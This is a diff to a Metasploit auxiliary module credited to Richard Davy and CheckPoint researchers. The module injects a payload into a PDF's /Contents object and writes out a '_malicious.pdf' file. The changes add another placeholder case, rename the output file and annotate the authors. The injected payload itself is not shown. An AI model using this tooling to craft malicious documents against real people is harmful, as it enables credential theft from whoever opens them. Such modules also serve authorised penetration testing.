@@ -17,8 +17,8 @@ class MetasploitModule < Msf::Auxiliary
         'License'       => MSF_LICENSE,
         'Author'        =>
             [
-              'Richard Davy - secureyourit.co.uk',
-              'CheckPoint researchers - Assaf Baharav, Yaron Fruchtmann, Ido Solomon'
+              'Richard Davy - secureyourit.co.uk',  #Module written by Richard Davy
+              'CheckPoint researchers - Assaf Baharav, Yaron Fruchtmann, Ido Solomon' #Code provided as POC by CheckPoint Researchers
             ],
         'Platform'      => [ 'win' ],
         'References'    =>
@@ -61,17 +61,21 @@ class MetasploitModule < Msf::Auxiliary
       if content.index("/Contents 4 0 R") != nil
         #If place holder exists create new file content
         newdata = content[0..(content.index('/Contents 4 0 R')+14)]+inject_payload+content[(content.index('/Contents 4 0 R')+15)..-1]
+      elsif content.index("/Contents 6 0 R") != nil
+        #If place holder exists create new file content
+        newdata = content[0..(content.index('/Contents 6 0 R')+14)]+inject_payload+content[(content.index('/Contents 6 0 R')+15)..-1]
       elsif content.index("/Contents 8 0 R") != nil
         #If place holder exists create new file content
         newdata = content[0..(content.index('/Contents 8 0 R')+14)]+inject_payload+content[(content.index('/Contents 8 0 R')+15)..-1]
       end
 
       if newdata != nil
+        newfilename = datastore['PDFINJECT'][(0..(datastore['PDFINJECT'].length-5))]+"_malicious.pdf"
         #Write content to file
-        File.open(datastore['PDFINJECT']+".malicious", 'wb') { |file| file.write(newdata) }
+        File.open(newfilename, 'wb') { |file| file.write(newdata) }
         #Check file exists and display path or error message
-        if File.exists?(datastore['PDFINJECT']+".malicious")
-          print_good("Malicious file writen to #{datastore['PDFINJECT']}"+".malicious")
+        if File.exists?(newfilename)
+          print_good("Malicious file writen to "+newfilename)
         else
           print_error "Something went wrong creating malicious PDF file"
         end
